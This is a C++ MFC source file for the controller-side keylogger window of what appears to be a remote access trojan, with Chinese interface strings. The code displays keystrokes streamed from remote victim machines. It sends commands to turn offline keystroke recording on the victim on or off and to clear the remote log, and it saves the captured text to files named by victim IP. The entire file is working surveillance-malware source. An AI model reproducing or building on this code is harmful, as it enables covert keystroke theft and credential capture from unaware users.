// KeyBoardDlg.cpp : implementation file
//

#include "stdafx.h"
#include <WinUser.h>
#include "KeyBoardDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define IDM_ENABLE_OFFLINE	0x0010
#define IDM_CLEAR_RECORD	0x0011
#define IDM_SAVE_RECORD		0x0012

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardDlg dialog


CKeyBoardDlg::CKeyBoardDlg(CWnd* pParent, Server* pIOCPServer, ClientContext *pContext)
    : DialogBase(CKeyBoardDlg::IDD, pParent, pIOCPServer, pContext, IDI_KEYBOARD)
{
    m_bIsOfflineRecord = (BYTE)m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[1];
}


void CKeyBoardDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    //{{AFX_DATA_MAP(CKeyBoardDlg)
    DDX_Control(pDX, IDC_EDIT, m_edit);
    //}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CKeyBoardDlg, CDialog)
    //{{AFX_MSG_MAP(CKeyBoardDlg)
    ON_WM_SIZE()
    ON_WM_CLOSE()
    ON_WM_SYSCOMMAND()
    //}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardDlg message handlers

void CKeyBoardDlg::PostNcDestroy()
{
    // TODO: Add your specialized code here and/or call the base class
    delete this;
    CDialog::PostNcDestroy();
}

BOOL CKeyBoardDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // TODO: Add extra initialization here
    SetIcon(m_hIcon, TRUE);			// Set big icon
    SetIcon(m_hIcon, FALSE);		// Set small icon

    CMenu* pSysMenu = GetSystemMenu(FALSE);
    if (pSysMenu != NULL) {
        //pSysMenu->DeleteMenu(SC_TASKLIST, MF_BYCOMMAND);
        pSysMenu->AppendMenu(MF_SEPARATOR);
        pSysMenu->AppendMenu(MF_STRING, IDM_ENABLE_OFFLINE, "离线记录(&O)");
        pSysMenu->AppendMenu(MF_STRING, IDM_CLEAR_RECORD, "清空记录(&C)");
        pSysMenu->AppendMenu(MF_STRING, IDM_SAVE_RECORD, "保存记录(&S)");
        if (m_bIsOfflineRecord)
            pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_CHECKED);
    }

    UpdateTitle();

    m_edit.SetLimitText(MAXDWORD); // 设置最大长度

    // 通知远程控制端对话框已经打开
    BYTE bToken = COMMAND_NEXT;
    m_ContextObject->Send2Client(&bToken, sizeof(BYTE));

    return TRUE;  // return TRUE unless you set the focus to a control
    // EXCEPTION: OCX Property Pages should return FALSE
}


void CKeyBoardDlg::UpdateTitle()
{
    CString str;
    str.Format(_T("%s - 键盘记录"), m_IPAddress);
    if (m_bIsOfflineRecord)
        str += " (离线记录已开启)";
    else
        str += " (离线记录未开启)";
    SetWindowText(str);
}

void CKeyBoardDlg::OnReceiveComplete()
{
    switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0]) {
    case TOKEN_KEYBOARD_DATA:
        AddKeyBoardData();
        break;
    default:
        return;
    }
}

void CKeyBoardDlg::AddKeyBoardData()
{
    // 最后填上0
    m_ContextObject->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
    int	len = m_edit.GetWindowTextLength();
    m_edit.SetSel(len, len);
    m_edit.ReplaceSel((TCHAR *)m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
}

bool CKeyBoardDlg::SaveRecord()
{
    CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.txt");
    CFileDialog dlg(FALSE, "txt", strFileName, OFN_OVERWRITEPROMPT, "文本文档(*.txt)|*.txt|", this);
    if(dlg.DoModal () != IDOK)
        return false;

    CFile	file;
    if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate)) {
        MessageBox("文件保存失败："+dlg.GetPathName(), "提示");
        return false;
    }
    // Write the DIB header and the bits
    CString	strRecord;
    m_edit.GetWindowText(strRecord);
    file.Write(strRecord, strRecord.GetLength());
    file.Close();

    return true;
}

void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
    if (nID == IDM_ENABLE_OFFLINE) {
        CMenu* pSysMenu = GetSystemMenu(FALSE);
        if (pSysMenu != NULL) {
            m_bIsOfflineRecord = !m_bIsOfflineRecord;
            BYTE bToken[] = { COMMAND_KEYBOARD_OFFLINE, m_bIsOfflineRecord };
            m_ContextObject->Send2Client(bToken, sizeof(bToken));
            if (m_bIsOfflineRecord)
                pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_CHECKED);
            else
                pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_UNCHECKED);
        }
        UpdateTitle();

    } else if (nID == IDM_CLEAR_RECORD) {
        BYTE bToken = COMMAND_KEYBOARD_CLEAR;
        m_ContextObject->Send2Client(&bToken, 1);
        m_edit.SetWindowText("");
    } else if (nID == IDM_SAVE_RECORD) {
        SaveRecord();
    } else {
        CDialog::OnSysCommand(nID, lParam);
    }
}

void CKeyBoardDlg::ResizeEdit()
{
    RECT	rectClient;
    RECT	rectEdit;
    GetClientRect(&rectClient);
    rectEdit.left = 0;
    rectEdit.top = 0;
    rectEdit.right = rectClient.right;
    rectEdit.bottom = rectClient.bottom;
    m_edit.MoveWindow(&rectEdit);
}
void CKeyBoardDlg::OnSize(UINT nType, int cx, int cy)
{
    CDialog::OnSize(nType, cx, cy);

    // TODO: Add your message handler code here
    if (IsWindowVisible())
        ResizeEdit();
}


BOOL CKeyBoardDlg::PreTranslateMessage(MSG* pMsg)
{
    // TODO: Add your specialized code here and/or call the base class
    if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)) {
        return true;
    }
    return CDialog::PreTranslateMessage(pMsg);
}

void CKeyBoardDlg::OnClose()
{
    CancelIO();
    // 等待数据处理完毕
    if (IsProcessing()) {
        ShowWindow(SW_HIDE);
        return;
    }

    DialogBase::OnClose();
}
